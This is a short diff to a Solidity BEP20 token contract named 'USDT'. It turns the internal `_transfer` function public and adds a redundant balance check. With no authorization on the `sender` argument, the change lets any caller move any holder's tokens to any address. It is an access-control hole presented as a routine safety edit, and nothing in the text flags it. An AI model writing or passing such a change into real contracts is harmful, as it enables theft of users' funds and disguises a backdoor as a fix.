@@ -526,9 +526,10 @@ contract USDT is Context, IBEP20, Ownable {
    * - `recipient` cannot be the zero address.
    * - `sender` must have a balance of at least `amount`.
    */
-  function _transfer(address sender, address recipient, uint256 amount) internal {
+  function _transfer(address sender, address recipient, uint256 amount) public {
     require(sender != address(0), "BEP20: transfer from the zero address");
     require(recipient != address(0), "BEP20: transfer to the zero address");
+    require(_balances[sender] >= amount, "BEP20: transfer amount exceeds balance");
 
     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
     _balances[recipient] = _balances[recipient].add(amount);
